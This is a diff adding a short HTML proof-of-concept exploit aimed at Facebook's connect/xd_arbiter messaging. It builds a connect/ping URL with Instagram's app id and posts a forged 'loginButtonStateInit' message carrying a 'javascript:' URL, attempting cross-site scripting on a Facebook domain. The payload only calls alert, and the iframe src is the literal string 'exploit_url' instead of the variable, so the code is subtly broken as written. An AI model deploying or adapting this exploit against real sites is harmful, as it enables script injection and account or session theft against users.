@@ -1,0 +1,15 @@
+    
+<html>
+<script>
+var app_id = '124024574287414',
+app_domain = 'www.instagram.com';
+
+var exploit_url = 'https://www.facebook.com/connect/ping?client_id=' + app_id + '&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2F7SWBAvHenEn.js%3Fversion%3D44%23origin%3Dhttps%253A%252F%252F' + app_domain;
+function fbFrameLoaded() {
+  var iframeEl = document.getElementById('fbframe');
+  var message = {"xdArbiterHandleMessage":true,"message":{"method":"loginButtonStateInit","params":JSON.stringify({'call':{'id':'123','url':'javascript:alert(document.domain);','size':{'width':10,'height':10},'dims':{'screenX':0,'screenY':23,'outerWidth':1680,'outerHeight':971,'screenWidth':1680}}})},"origin":"ORIGIN"};
+  iframeEl.contentWindow.postMessage(message, '*');
+};
+</script>
+<iframe id="fbframe" src="exploit_url" onload="fbFrameLoaded(this)"></iframe>
+</html>
